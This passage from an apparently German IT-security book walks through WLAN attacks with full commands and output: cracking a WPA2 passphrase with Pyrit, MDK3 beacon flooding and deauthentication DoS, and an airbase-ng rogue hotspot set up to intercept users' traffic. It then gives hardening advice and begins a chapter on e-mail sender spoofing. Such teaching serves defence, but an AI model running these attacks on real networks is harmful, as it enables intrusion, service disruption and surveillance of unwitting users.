ESSID,... root@discordia:~# pyrit -e KANZLEI_BERGER create_essid Pyrit 0.2.5-dev (C) 2008, 2009 Lukas Lueg http://pyrit.googlecode.com This code is distributed under the GNU General Public License v3 Connecting to storage... connected Created ESSID 'KANZLEI_BERGER' Created ESSID 'KANZLEI_BERGER' root@discordia:~#\n...importieren anschlie\u00dfend unsere Passwortliste... root@discordia:~# pyrit -i /wordlists/all.lst import_passwords Pyrit 0.2.5-dev (C) 2008, 2009 Lukas Lueg http://pyrit.googlecode.com This code is distributed under the GNU General Public License v3 Connecting to storage... connected 3917196 lines read. Flushing buffers... All done. root@discordia:~#\n...und nehmen im letzten Schritt die eigentliche Berechnung vor. root@discordia:~# pyrit -e \"KANZLEI_BERGER\" -i /wordlists/all.lst -r berger_wpa.dump-01.cap attack_passthrough Pyrit 0.2.5-dev (C) 2008, 2009 Lukas Lueg http://pyrit.googlecode.com This code is distributed under the GNU General Public License v3 Connecting to storage... connected Parsing file '/berger_wpa.dump-01.cap' (1/1)... 2825 packets (2825 802.11-packets), 1 APs\n326\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nPicked AccessPoint 00:14:6c:1d:1c:c2 automatically... Tried 340006 PMKs so far; 862 PMKs per second. Computed 953.16 PMKs/s total. #1: 'CUDA-Device #1 'GeForce 9300 GS'': 454.4 PMKs/s (Occ. 99.5%; RTT 3.5) #2: 'CPU-Core (SSE2)': 505.0 PMKs/s (Occ. 99.2%; RTT 2.9) The password is 'indubioproreo'. root@discordia:~#\nVolltreffer, die WPA2-Passphrase ist ermittelt! Pyrit liefert zugleich die schnellste R\u00fcckmeldung, bei der Einbindung von GPUs handelt es sich somit um eine h\u00f6chst effiziente Methode. Als Fazit bleibt festzuhalten, dass die WPA2-Verschl\u00fcsselung f\u00fcr den Betrieb eines WLAN im Heimumfeld auch weiterhin zu empfehlen ist. Voraussetzung f\u00fcr die Entfaltung eines wirkungsvollen Schutzschildes ist jedoch die Beachtung einiger Grunds\u00e4tze, auf die wir sp\u00e4ter noch n\u00e4her eingehen werden.\n16.3.7 WLAN mon amour \u2013 Freu(n)de durch Funkwellen W\u00e4hrend wir in der Erstausgabe dieses Buches noch darauf aufmerksam machten, wie humorvolle Funknetzforscher die Titel der Service Set Identifier (SSID) ungesicherter WLANs auf am\u00fcsante Art deformieren und die Betreiber damit blo\u00dfstellen, ebbt dieser Trend leider zunehmend ab. Nicht ganz unverantwortlich an dieser Entwicklung sind Hersteller von WLAN-Komponenten, die ihre Ger\u00e4tschaften mittlerweile mit verbesserten Schutzmechanismen ausliefern; eine bereits ab Werk aktivierte WPA-Verschl\u00fcsselung macht es Verfechtern von \u00bbdigitalen Graffiti\u00ab unerh\u00f6rt schwer. Ungeachtet dessen ist das Bet\u00e4tigungsfeld f\u00fcr WLAN-Nerds auch weiterhin \u00e4u\u00dferst facettenreich, haben sich doch neue Formen der chaotischen Freizeitgestaltung entwickelt. Zu den Programmen, die mannigfaltige M\u00f6glichkeiten des schnurlosen Schabernacks bieten, geh\u00f6rt MDK3. MDK3 versteht sich nicht nur auf das Brechen von MAC-Filtern oder das Enttarnen versteckter SSIDs, sondern beherrscht zudem die hohe Kunst des Beacon Flooding und des Denial of Service (DoS) \u2013 eine ideale Spielwiese f\u00fcr digitale Klingelstreiche! F\u00fcr unseren ersten Streich nehmen wir uns vor, die in der Umgebung befindlichen WLAN-Teilnehmer durch unz\u00e4hlige Hot-Spots zu verwirren. Das Pikante dabei ist, dass die Hot-Spots zwar f\u00fcr jedermann sichtbar, diese aber weder existent noch funktionsf\u00e4hig sind. Ein wahres Schreckgespenst f\u00fcr Messen, Kongresse, Flugh\u00e4fen oder Szenecafes. Um das nun folgende SSID-Funkfeuerwerk ein wenig abwechselungsreicher zu gestalten, verwenden wir hierzu die \u00bbtop 1000 SSID list\u00ab von wigle.net160, quasi die \u00bbTop of 160\nhttp://www.wigle.net/gps/gps//Stat\n16.3 Angriffe auf Funknetze\n327\nthe Pops\u00ab aus insgesamt 5 Millionen Access-Points aus dem amerikanisch/europ\u00e4ischen Raum. MDK3 wird wie folgt gestartet, wobei mit wlan0 unser Netzwerkinterface festgelegt wird, der Parameter b auf den Beacon Flood Mode verweist, das nachfolgende -f die Textdatei mit den zu simulierenden SSIDs vorgibt, -w \u2013g und \u2013m Eckdaten der/des Access-Points bestimmen (WEP-Verschl\u00fcsselung, 54 MBit nebst valider MAC-Adresse) und sich \u2013s f\u00fcr die zeitliche Taktung verantwortlich zeigt: root@discordia:~# mdk3 wlan0 b -f /home/andreas/wigle/ssid.txt -w -g -m -s 50 Current Current Current Current Current Current Current Current Current Current Current (...)\nMAC: MAC: MAC: MAC: MAC: MAC: MAC: MAC: MAC: MAC: MAC:\n00:0C:30:29:CD:BA 00:80:C6:D0:85:FA 00:0D:54:39:CC:CA 00:09:43:51:A2:BB 00:60:6D:D4:BB:BD 00:30:F1:C1:57:E0 00:0A:8A:0E:EB:D1 00:13:7F:86:EA:91 00:13:C4:97:CE:63 00:0E:83:89:84:5C 00:12:88:98:89:06\nCurrent MAC: 00:01:F4:F0:8E:B4 7050 Current MAC: 00:0A:41:50:21:66 Current MAC: 00:04:75:14:39:3A Current MAC: 00:01:F4:A9:ED:AA Packets sent: 13151 \u2013 Speed: root@discordia:~#\non on on on on on on on on on on\nChannel 2 with SSID: Linksys Channel 10 with SSID: Channel 3 with SSID: Thomson Channel 9 with SSID: cvsretail Channel 8 with SSID: default-ssid Channel 9 with SSID: hyatt Channel 5 with SSID: WSR-5000 Channel 2 with SSID: holiday Channel 7 with SSID: 2WIRE475 Channel 2 with SSID: NETGEAR_11g Channel 9 with SSID: ZyXEL\non Channel 10 with SSID: FRITZ!Box Fon WLAN on Channel 13 with SSID: 2WIRE755 on Channel 14 with SSID: 5ECUR3w3p5TOR3 on Channel 12 with SSID: V1500 62 packets/sec^C\nEin in Reichweite befindlicher WLAN-Client, beispielsweise ein Rechner unter Windows 7, kann bei folgendem Schauspiel schon etwas ins Schwitzen kommen \u2013 und den Benutzer beim Anblick einer aus etwa 100 Hot-Spots bestehenden, sich dynamisch aktualisierenden WLAN-Liste in den schieren Wahnsinn treiben. Wer sich mit MKD3 nicht anfreunden m\u00f6chte, mag einen Blick auf das vom Spa\u00dffaktor her vergleichbare Perl-Script Fake AP161 werfen.\n161\nhttp://www.blackalchemy.to/project/fakeap\n328\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.57: Es scheinen sich unz\u00e4hlige Hot-Spots in der Umgebung zu befinden... Guerilla-Marketing?\nF\u00fcr die n\u00e4chste Kapriole demonstrieren wir, wie sich ein Access-Point in Grund und Boden schie\u00dfen l\u00e4sst \u2013 oder zumindest so sehr ins Trudeln ger\u00e4t, dass eine vern\u00fcnftige Kommunikation nicht mehr m\u00f6glich ist. Hierzu best\u00fccken wir MDK3 mit unserem Netzwerkinterface wlan0, dem Parameter a f\u00fcr den \u00bbAuthentication DoS mode\u00ab samt Nennung der zu penetrierenden ESSID durch \u2013a und dem Verweis zur Wahl valider MAC-Adressen (-m). root@discordia:~# mdk3 wlan0 a -a 00:22:6B:70:1E:FE \u2013m AP 00:22:6B:70:1E:FE is responding! Connecting Client: 00:90:D1:EC:29:CD to target AP: 00:22:6B:70:1E:FE AP 00:22:6B:70:1E:FE seems to be INVULNERABLE! Device is still responding with 500 clients connected! Connecting Client: 00:0A:04:10:52:BC to target AP: 00:22:6B:70:1E:FE AP 00:22:6B:70:1E:FE seems to be INVULNERABLE! Device is still responding with 1000 clients connected! AP 00:22:6B:70:1E:FE seems to be INVULNERABLE! Device is still responding with 1500 clients connected! Connecting Client: 00:40:01:2A:6D:77 to target AP: 00:22:6B:70:1E:FE (...) Device is still responding with 201500 clients Connecting Client: 00:02:2D:2D:97:56 to target AP 00:22:6B:70:1E:FE seems to be INVULNERABLE! Device is still responding with 202000 clients AP 00:22:6B:70:1E:FE seems to be INVULNERABLE! Device is still responding with 202500 clients ^C root@discordia:~#\nconnected! AP: 00:22:6B:70:1E:FE connected! connected!\n16.3 Angriffe auf Funknetze\n329\nObwohl sich der unter Volllast stehende Hot-Spot recht wacker zu schlagen scheint \u2013 immerhin zeigt sich dieser auf den ersten Blick unbeeindruckt von den simulierten Verbindungsversuchen durch ann\u00e4hrend 200.000 Clients \u2013, sieht es mit der Konnektivit\u00e4t schon merklich schlechter aus. WLAN-Clients tun sich mit dem Verbindungsaufbau zumindest sichtlich schwer...\nBild 16.58: Der Hot-Spot scheint mit anderen T\u00e4tigkeiten ausgelastet\u2026\nEine martialische Steigerung liefert MDK3 mit dem Deauthentication / Disassociation Amok Mode. Hierbei werden s\u00e4mtliche Teilnehmer brutalst aus dem WLAN geworfen, die Kommunikation wird unmittelbar unterbunden. Wir starten abermals MDK3, verweisen auf unsere WLAN-Karte wlan0 und binden Parameter ein wie d f\u00fcr den \u00bbDeauthentication / Disassociation Amok Mode\u00ab, -c 4 f\u00fcr den zu \u00fcberschwemmenden Kanal 4 und \u2013s 250 f\u00fcr die Geschwindigkeit der Pakete. Das Ergebnis ist ein Leuchtfeuer der ganz besonderen Art... root@discordia:~# mdk3 wlan0 d -c 4 -s 250 Disconnecting Disconnecting Disconnecting Disconnecting (...)\nbetween: between: between: between:\n00:21:5C:54:7D:CD 00:21:5C:54:7D:CD 00:21:5C:54:7D:CD 00:21:5C:54:7D:CD\nand: and: and: and:\n00:22:6B:70:1E:FE 00:22:6B:70:1E:FE 00:22:6B:70:1E:FE 00:22:6B:70:1E:FE\non on on on\nchannel: channel: channel: channel:\n4 4 4 4\nDisconnecting between: 00:21:5C:54:7D:CD and: 00:22:6B:70:1E:FE on channel: 4 Disconnecting between: 00:21:5C:54:7D:CD and: 00:22:6B:70:1E:FE on channel: 4 Packets sent: 1209 \u2013 Speed: 116 packets/sec^C root@discordia:~#\n...welches die Kommunikation von WLAN-Clients mit ihrem Access-Point radikal unterbindet. Wohl dem, der keine (zeit-)kritischen Anwendungen per Funk betreibt und der nicht auf ein einwandfreies Funktionieren des Netzes angewiesen ist!\n330\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.59: Communication Disruption: Disassociation Amok Mode aus Perspektive eines WLAN-Clients\nDie M\u00f6glichkeiten von MDK3 durch zahlreiche Formen der \u00bbDesorientierung\u00ab sind jedoch als harmlos einzustufen, zumindest im direkten Vergleich zu dem in AirbaseNG162 schlummernden (MITM-)Spitzelpotenzial. Wie viele der wertvollen WLAN-Tools entstammt auch Airbase-NG/softAP der bereits mehrfach erw\u00e4hnten Aircrack-NG-Suite. Es handelt sich dabei um ein recht umfangreiches Programm, welches unter anderem die M\u00f6glichkeit bietet, einen eigenen AccessPoint zu erstellen \u2013 einschlie\u00dflich des sich dadurch ergebenden Unterhaltungswerts. Gehen wir im Folgenden davon aus, dass wir uns an einem sch\u00f6nen Sommertag mit unserem Netbook in einem gut besuchten Szenelokal in der Innenstadt befinden. Ein fl\u00fcchtiger Blick auf die Nachbartische offenbart zahlreiche Smartphones, Netbooks und portable Media Player wie den iPod touch, sogar ein iPad l\u00e4sst sich ausmachen. Ungeachtet der Tatsache, dass UMTS-Tarife mittlerweile in bezahlbare Gr\u00f6\u00dfenordnungen ger\u00fcckt sind, gibt es noch eine Vielzahl von Menschen, die den Zugriff auf das Internet \u00fcber WLAN bevorzugen \u2013 aus welchen Gr\u00fcnden auch immer. Seien Sie deshalb versichert: Sobald wir in einer belebten Fu\u00dfg\u00e4ngerzone ein imagin\u00e4res Schild aufstellen mit der Aufschrift \u00bbHIER INTERNET \u2013 GRATIS\u00ab, werden wir uns alsbald umringt f\u00fchlen von zahleichen digitalen Nomaden \u2013 sei es bewusst oder unbewusst, schlie\u00dflich zeigen sich viele der Taschencomputer unglaublich kommunikativ. Mit diesem Gedanken im Hinterkopf entschlie\u00dfen wir uns dazu, einen pr\u00e4parierten Access-Point/softAP in die Welt zu setzen, der kostenlosen Zugriff auf das Internet offeriert. Unser Ziel dabei ist, m\u00f6glichst viele WLAN-Clients von diesem Service partizipieren zu lassen. Ein fairer Deal: Wir liefern Internet und als Gegenleistung gew\u00e4hren uns unsere unwissenden \u00bbKunden\u00ab Einblicke in ihre Kommunikation.\n162\nhttp://www.aircrack-ng.org/doku.php?id=airbase-ng\n16.3 Angriffe auf Funknetze\n331\nF\u00fcr den angehenden Dienst als Funkdirektor ben\u00f6tigen wir zun\u00e4chst selber Zugang zum Internet, beispielsweise \u00fcber das UMTS-Netz oder durch einen (m\u00f6glicherweise kommerziellen) Hot-Spot. Unser Netbook muss somit mindestens zwei Netzwerkkarten beherbergen: Mit der einen w\u00e4hlen wir uns in das Internet ein (in unserem Beispiel wlan1), die andere tr\u00e4gt Verantwortung f\u00fcr den pr\u00e4parierten Access-Point (wlan0). Wir beginnen mit Airmon-NG und schalten das f\u00fcr den Access-Point vorgesehene WLAN-Interface in den Monitoring-Mode. Der Hinweis von dhclient braucht uns nicht zu beunruhigen und erkl\u00e4rt sich dahingehend, dass wlan1 bereits eine Verbindung zum Internet aufgebaut hat. root@discordia:~# airmon-ng start wlan0\nFound 1 processes that could cause trouble. If airodump-ng, aireplay-ng or airtun-ng stops working after a short period of time, you may want to kill (some of) them! PID 7749\nName dhclient\nInterface\nChipset\nDriver\nwlan0 wlan1\nAtheros Atheros\nath5k \u2013 [phy0] ath5k \u2013 [phy1] (monitor mode enabled on mon0)\nroot@discordia:~#\nIm Folgenden starten wir Airbase-NG mit uns geeignet erscheinenden Parametern: Durch \u2013e deklarieren wir die SSID des pr\u00e4parierten Hot-Spot (INTERNET4FREE), -a t\u00e4uscht eine falsche ESSID vor (in Wahrheit entstammt die MAC-Adresse einer vertrauenserweckenden FRITZ!Box Fon WLAN 7170), -c 9 definiert den WLAN-Kanal und bei mon0 handelt es sich um unsere in den Monitoring-Mode geschaltete WLAN-Karte. Der Parameter \u2013P nimmt eine Sonderstellung ein und bedarf einer kurzen Erl\u00e4uterung: So k\u00fcmmert sich -P darum, dass den mittels Probes anfragenden WLAN-Clients ein geeigneter Kommunikationspartner angeboten wird, selbst wenn sich der Client ausschlie\u00dflich mit einer ganz bestimmten ESSID koppeln m\u00f6chte. Fragt vereinfacht ausgedr\u00fcckt beispielsweise ein iPod Touch gezielt nach \u00bbseinem\u00ab WLAN mit der ESSID \u00bbNetgear\u00ab, so bekommt er diese umgehend pr\u00e4sentiert, um sich daraufhin automatisiert einzuloggen. Ist dieses Feature nicht zu sch\u00f6n, um wahr zu sein?\n332\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nroot@discordia:~# airbase-ng -e \"INTERNET4FREE\" -a 00:1C:A4:A5:90:45 -c 9 P mon0 21:16:13 21:16:13 21:16:13 21:16:13\nCreated tap interface at0 Trying to set MTU on at0 to 1500 Trying to set MTU on mon0 to 1800 Access Point with BSSID 00:1C:A4:A5:90:45 started.\nIm n\u00e4chsten Moment weisen wir dem durch Airbase-NG erstellen TAP-Interface at0 eine IP-Adresse zu und starten es, um uns anschlie\u00dfend des DHCP-Dienstes anzunehmen: root@discordia:~# ifconfig at0 10.0.0.1 up root@discordia:~#\nDie Datei /etc/dhcp3/dhcpd.conf sollte sich hierbei an Werten aus dem nachkommenden Beispiel orientieren, um den anfragenden WLAN-Clients ein H\u00f6chstma\u00df an Komfort und eine geeignete IP-Range zu bieten. Hierbei ein Hinweis am Rande: Die definierten Nameserver 208.67.222.222 und 208.67.220.220 stammen von OpenDNS163 und stellen somit begleitend sicher, dass unsere ehrbaren \u00bbKunden\u00ab vor dubiosen Web-Sperren164 und \u00bbZensursula-Stoppschildern\u00ab verschont bleiben. root@discordia:~# cat /etc/dhcp3/dhcpd.conf option domain-name-servers 208.67.222.222, 208.67.220.220; default-lease-time 60; max-lease-time 72; ddns-update-style none; authoritative; log-facility local7; subnet 10.0.0.0 netmask 255.255.255.0 { range 10.0.0.100 10.0.0.254; option routers 10.0.0.1; option domain-name-servers 208.67.222.222, 208.67.220.220 ; } root@discordia:~#\n163\nhttp://www.opendns.com\n164\nhttp://www.zensursula.net\n16.3 Angriffe auf Funknetze\n333\nIst die Konfigurationsdatei f\u00fcr unseren DHCP-Daemon mit sinnvollem Inhalt best\u00fcckt, starten wir den Dienst wie folgt: root@discordia:~# mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd root@discordia:~# dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcpd/dhcpd.pid at0 Internet Systems Consortium DHCP Server V3.1.1 Copyright 2004-2008 Internet Systems Consortium. All rights reserved. For info, please visit http://www.isc.org/sw/dhcp/ Wrote 0 leases to leases file. Listening on LPF/at0/00:1c:a4:a5:90:45/10.0.0/24 Sending on LPF/at0/00:1c:a4:a5:90:45/10.0.0/24 Sending on Socket/fallback/fallback-net root@discordia:~#\nNach abschlie\u00dfender Inbetriebnahme der Routingfunktionen k\u00f6nnen sich die ersten Clients mit unserem Access-Point verbinden und Zugriff auf das Internet nehmen \u2013 nat\u00fcrlich exklusiv \u00fcber unser Netbook. root@discordia:~# sysctl -w net/ipv4/ip_forward=1 net.ipv4.ip_forward = 1 root@discordia:~# modprobe ipt_MASQUERADE root@discordia:~# iptables -A POSTROUTING -t nat -o wlan1 -j MASQUERADE root@discordia:~#\nBild 16.60: Die ersten Clients verbinden sich \u2013 ob bewusst oder unbewusst \u2013 mit unserem Access-Point...\n334\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.61: \u2026ohne die b\u00f6se Falle wittern zu k\u00f6nnen. Warum auch: Internet geht ja \u2013 und das kostenlos!\nDem geneigten Leser wird sp\u00e4testens an dieser Stelle bewusst sein, dass wir nun vollst\u00e4ndige Kontrolle auf den Transitverkehr unserer ahnungslosen Opfer aus\u00fcben k\u00f6nnten. Die uns jetzt im Rahmen des Snarfing165 zur Verf\u00fcgung stehenden M\u00f6glichkeiten sind schier unbegrenzt: So kann beispielsweise der gesamte Datenverkehr mitgeschnitten, analysiert, manipuliert und ausgewertet werden, was insbesondere bei ungesch\u00fctzter Kommunikation \u2013 mehrheitlich SMTP/POP3, FTP und unzureichend abgesicherten Websites \u2013 ein nicht unerhebliches Problem darstellt. Kompromittierende Mitschnitte durch Driftnet stellen hierbei noch das kleinste \u00dcbel dar.\nBild 16.62: Driftnet beim Mitschnitt der beim Surfen \u00fcbertragenen Bilder. Ein Boulevard-Magazin?\n165\nhttp://de.wikipedia.org/wiki/Snarfing\n16.4 Sicherheitsma\u00dfnahmen bei Wireless LAN\n335\nOftmals geht Snarfing einher mit der Verteilung von Schadsoftware, beispielsweise durch die Ausnutzung sicherheitsrelevanter Schw\u00e4chen von Standardsoftware. Wo sonst als hier f\u00e4llt es leichter, den WLAN-Clients eine manipulierte Website aufzub\u00fcrden, auf die der Internet Explorer allergisch reagiert? Ferner lassen sich durch Pharming166 die DNS-Anfragen der WLAN-Clients manipulieren, um die Benutzer auf gef\u00e4lschte Webseiten umzuleiten (vorzugsweise begehrte Online-Dienste wie Ebay, Amazon, Facebook oder Kreditinstitute), teuflischen Kriminellen sind hier kaum Grenzen gesetzt. Wer \u00f6ffentliche Hot-Spots nun bewusst meidet und seine digitalen Begleiter ausschlie\u00dflich \u00fcber den heimischen WLAN-Router mit dem Internet kommunizieren l\u00e4sst, sollte sich jedoch nicht zu fr\u00fch in Sicherheit wiegen: Die in diesem Kapitel vorgestellten Tools lassen sich n\u00e4mlich auch dazu bewegen, die WLAN-Verbindung eines Dritten \u00bbumzubiegen\u00ab und anschlie\u00dfend \u00fcber einen anderen, pr\u00e4parierten Weg wieder aufbauen. Hierzu reicht es aus, die origin\u00e4re, unzureichend gesicherte WLAN-Verbindung samt Clients und Konfiguration per Airodump-NG zu erfassen, den WLAN-Router nebst Kommunikation durch MDK3 au\u00dfer Gefecht zu setzen, die Identit\u00e4t des WLANRouters einzunehmen und auf einen Reconnect der Clients zu warten. Fertig! Zugegeben, diese gut vorzubereitende und zeitaufwendige Form des Hijackings mag selten auftreten, die technische Umsetzung stellt jedoch kaum eine Herausforderung dar. Die Empfehlung der Autoren lautet folglich, nicht nur \u00bbsafer Internet\u00ab z. B. durch den Einsatz von VPN-Techniken zu betreiben \u2013 insbesondere bei Hot-Spots, die nicht unter der eigenen Hoheit stehen \u2013 sondern auch Wert auf eine gesicherte Konfiguration des heimischen Funk-Equipments zu legen (dazu sp\u00e4ter mehr).\n16.4\nSicherheitsma\u00dfnahmen bei Wireless LAN\nNachdem wir auf den letzten Seiten verdeutlicht haben, dass viele der bei WLAN angebotenen Sicherheitsvorkehrungen ausschlie\u00dflich tr\u00fcgerische Sicherheit schaffen, m\u00f6chten die Autoren zum Schluss des Kapitels sinnvolle L\u00f6sungsvorschl\u00e4ge zur H\u00e4rtung eines WLAN liefern. Grunds\u00e4tzlich erweist sich der Betrieb eines sicheren WLAN (nach aktuellem Wissensstand) als nicht sonderlich kompliziert, sofern Sie die folgenden Punkte beherzigen. Einsatz von WPA2 In einem h\u00e4uslichen WLAN sollte der als sicher geltende und auf AES basierende Sicherheitsstandard WPA2 zum Einsatz kommen. Zumindest zum aktuellen Zeitpunkt gibt es bei dem Nachfolgestandard von WEP und WPA keine erkennbare strukturelle Schw\u00e4che.\n166\nhttp://de.wikipedia.org/wiki/Pharming\n336\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nDie Autoren warnen davor, oftmals angef\u00fchrten Begr\u00fcndungen Glauben zu schenken, dass WEP f\u00fcr geringe Sicherheitsanforderungen ausreichend sei. Wir haben verdeutlicht, dass ein erfolgreicher Angriff beispielsweise auf WEP keine nennenswert hohe H\u00fcrde darstellt, folglich raten wir strikt von WEP ab. Selbst wenn die durch einen Kriminellen zu erbeutenden Daten eines WLAN wertlos sein m\u00f6gen, kann \u00fcber das unzul\u00e4nglich gesicherte Netz immer noch genug Schindluder getrieben und der Betreiber vor Probleme gestellt werden (wie einem 63-j\u00e4hrigen Internetnutzer aus N\u00fcrnberg widerfahren167, der eine Anzeige kassierte oder einem Recklingh\u00e4user, dem ein Spezialeinsatzkommando der Polizei die Wohnung st\u00fcrmte, weil von seinem Internetanschluss aus eine Amokdrohung verbreitet worden war168). Halten wir somit fest: WPA2 ist in den meisten F\u00e4llen das Mittel der Wahl. Haushalte, die sich unabh\u00e4ngig von Industriestandards machen und das Sicherheitsniveau deutlich steigern m\u00f6chten, legen unter die WPA2-Verschl\u00fcsselung zus\u00e4tzlich einen VPN-Layer, beispielsweise OpenVPN169 \u2013 nach Auffassung der Autoren f\u00fcr Unternehmen mit schutzbed\u00fcrftigen Inhalten ohnehin eine grunds\u00e4tzliche Pflicht! Wahl einer komplexen Passphrase Wie bereits verdeutlicht, h\u00e4lt die WPA2-Verschl\u00fcsselung den aktuellen kryptografischen Angriffen stand. Die bislang einzige Schw\u00e4che stellt die Verwendung eines schlechten Pre-Shared-Key dar, sodass der Passphrase eine Schl\u00fcsselrolle zukommt (wie in fast allen anderen Bereichen der Informationssicherheit auch). Bei dem Pre-Shared-Key der WPA-Verschl\u00fcsselung handelt es sich um eine Passphrase, die jeder im WLAN angeschlossene Teilnehmer kennen und zum \u00bbMitspielen\u00ab im gesch\u00fctzten Funknetz verwenden muss (analog zum Pre-Shared-Key von WEP). Setzt sich der Pre-Shared-Key beispielsweise aus einem Wort zusammen, welches in einem W\u00f6rterbuch zu finden ist, steht der W\u00f6rterbuchattacke T\u00fcr und T\u00fcr offen, und es ist nur eine Frage der Motivation des Angreifers, bis das WLAN geknackt ist (wie verdeutlicht im Kapitel \u00bbZugriff auf ein WPA2-verschl\u00fcsseltes WLAN\u00ab). Da sich der Aufwand zur Einrichtung eines WPA2-Schl\u00fcssels im Heimumfeld in \u00fcberschaubaren Bahnen bewegt, empfehlen die Autoren die Verwendung einer ausreichend langen Passphrase (wenn m\u00f6glich 63 Zeichen lang), die sich aus einer sinnlosen Kombination von Gro\u00df- und Kleinbuchstaben sowie Sonderzeichen und Zahlen zusammensetzt. Ein WPA2-Schl\u00fcssel, der \u00c4hnlichkeiten aufweist mit beispielsweise dem folgenden Zeichenwirrwarr \u00bbGqTtW6DuZyr&V&GrQ3TKDEfRvguZ2Q9c7VmKWkTD $pJx2UeuVsxUSxs4VaB?ga\u00ab, l\u00e4sst auch noch die n\u00e4chsten Jahre jeden W\u00f6rterbuch- oder Brute-Force-Angriff ins Leere laufen. Nat\u00fcrlich sollte nicht nur die WPA2-Verschl\u00fcsselung, sondern auch der Zugang zum Access-Point mit einer sinnvollen Passphrase abgesichert sein. In einem Fall, der uns zu Ohren gekommen ist, setzte sich der WPA2-Schl\u00fcssel zwar aus einer \u00e4u\u00dferst komplexen Kombination zusammen, der WLAN-Router war jedoch nur mit dem Default-Kennwort des Herstellers versehen. Ein interner Angreifer, der Zugang zum LAN hatte, 167\nhttp://www.presseportal.de/polizeipresse/p_story.htx?nr=920697\n168\nhttp://www.heise.de/newsticker/meldung/Ungesichertes-WLAN-fuehrt-zu-Polizei-Besuch-748381.html\n169\nhttp://openvpn.net\n16.4 Sicherheitsma\u00dfnahmen bei Wireless LAN\n337\nkonnte sich \u00fcber diesen Weg Zugriff auf den WLAN-Router verschaffen, den WPA2Schl\u00fcssel auslesen und die so ergaunerten Daten an einen Externen weiterreichen. F\u00fcr den Externen war es danach ein Leichtes, in der Nacht von einem Parkplatz aus auf das WLAN (und somit auch das LAN) zuzugreifen. Die Wahl einer sinnvollen und starken Passphrase ist somit in allen Bereichen von gro\u00dfer Bedeutung. Einsatz propriet\u00e4rer Hardware Grunds\u00e4tzlich verstehen sich die Autoren nicht als Freunde propriet\u00e4rer Entwicklungen, weder bei Soft- noch bei Hardware. Zur Sicherung eines WLAN, welches ausschlie\u00dflich einem kleinen Nutzerkreis vorbehalten ist (z. B. einem Teilbereich der eigenen Unternehmung), kann diese Form der Abschottung jedoch von Vorteil sein. Propriet\u00e4r bedeutet hierbei, dass WLAN-Ger\u00e4tschaften ganz bewusst keinem allgemein anerkannten Standard entsprechen, sondern hauseigene Entwicklungen des jeweiligen Herstellers sind. Viele Hersteller haben Eigenentwicklungen im Sortiment, die neben dem Betrieb g\u00e4ngiger WLAN-Standards eine h\u00f6here Bandbreite oder eine bessere Abdeckung in Form eines propriet\u00e4ren Verfahrens liefern (so beispielsweise bei den Routern nach 802.11g+, die Brutto\u00fcbertragungsraten von bis zu 108 MBit/s liefern). Diese Eigenentwicklung geht auf Kosten der Kompatibilit\u00e4t zu offiziellen Standards, sodass jeder WLAN-Teilnehmer Ger\u00e4tschaften des gleichen Herstellers ben\u00f6tigt, was sich im Fall gewollter Isolation als Vorteil erweisen kann. Diesen Weg beschreiten im \u00dcbrigen auch viele Hersteller aus dem Enterprise-Sektor, wie beispielsweise die Firma Cisco mit einer propriet\u00e4ren WLAN-Sicherheitstechnik. Als Fazit bleibt festzuhalten, dass der Einsatz propriet\u00e4rer Technik dazu beitragen kann, ein WLAN vor dem Zugriff durch Fremde abzusichern: Es ist n\u00e4mlich eher unwahrscheinlich, dass ein Angreifer, der sich in einem fremden WLAN tummeln m\u00f6chte, genau das dazu passende Produkt in seinem Arsenal hat.\n339\n17 Szenario VI: MalwareAttacke aus dem Internet Ausgangsszenario: In Ihrem Eingangskorb ist eine neue Mail gelandet; da Sie den Absender kennen, lesen Sie die Mail. Als Sie vom Inhalt \u00fcberrascht werden, klicken Sie auch auf den Anhang. Sie erhalten eine kurze, wenig aussagekr\u00e4ftige Fehlermeldung und denken sich nichts dabei. Zwei Tage sp\u00e4ter ruft Sie ein Freund an und fragt Sie, warum Sie ihm eine wurmverseuchte E-Mail gesendet haben. Sie sind mehr als irritiert, denn erstens haben Sie einen Virenscanner und zweitens die Windows-Firewall aktiviert. Wie konnte das trotzdem passieren, fragen Sie sich. Internetinfektionen k\u00f6nnen grunds\u00e4tzlich \u00fcber mehrere Wege erfolgen, n\u00e4mlich \u00fcber EMails, pr\u00e4parierte Webseiten oder spezielle Webservices (P2P, Chats, VoIP, ICQ), in Ausnahmef\u00e4llen erfolgt die Infektion auch direkt \u00fcber das Netzwerk, wobei in bestimmten F\u00e4llen auch mit einer Kombination mehrerer Angriffstechniken zu rechnen ist. Prozentual noch immer am h\u00e4ufigsten erfolgt der Angriff mit speziell pr\u00e4parierten EMails, wobei Drive-by-Infektionen stark zunehmen (vgl. hierzu auch den Lagebericht IT-Sicherheit 2009 des BSI170). Allerdings sollte jeder, der vor einem internetf\u00e4higen PC sitzt \u2013 unabh\u00e4ngig davon, ob im B\u00fcro oder zu Hause \u2013, wissen, dass er prinzipiell durch E-Mails wie durch unkontrolliertes Surfen gef\u00e4hrdet ist. Aber niemand rechnet damit, dass es ausgerechnet ihn erwischt, und zweitens hat man Firewall, Virenscanner und einen Service-Provider, der verd\u00e4chtige Mails herausfiltert. Also \u2013 was soll da schon passieren? Versetzen wir uns \u00fcbergangsweise in die Rolle eines Angreifers. Was muss er tun, um die Arglosigkeit seines Opfers auszunutzen?\n170\nhttps://www.bsi.bund.de/ContentBSI/Publikationen/Lageberichte/bsi-lageberichte.html\n340\n17.1\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nAngriffe via E-Mail\nBild 17.1: Angriffsstrategie f\u00fcr E-Mail-Attacker\n17.1.1 Absendeadresse f\u00e4lschen Da es sehr ungeschickt w\u00e4re, infizierte E-Mails mit der eigenen Absenderangabe zu versehen, m\u00fcssen wir zuerst unsere E-Mail-Adresse f\u00e4lschen, was schwerer ist, als es aussieht. In Betracht k\u00e4me nat\u00fcrlich auch noch eine Fake-Anmeldung bei Yahoo & Co. Hier sind allerdings zwei Dinge zu beachten. Erstens d\u00fcrfen solche anonymisierten EMail-Accounts nur \u00fcber einen aktivierten Proxyserver angelegt und administriert werden, um keine r\u00fcckverfolgbaren Spuren via 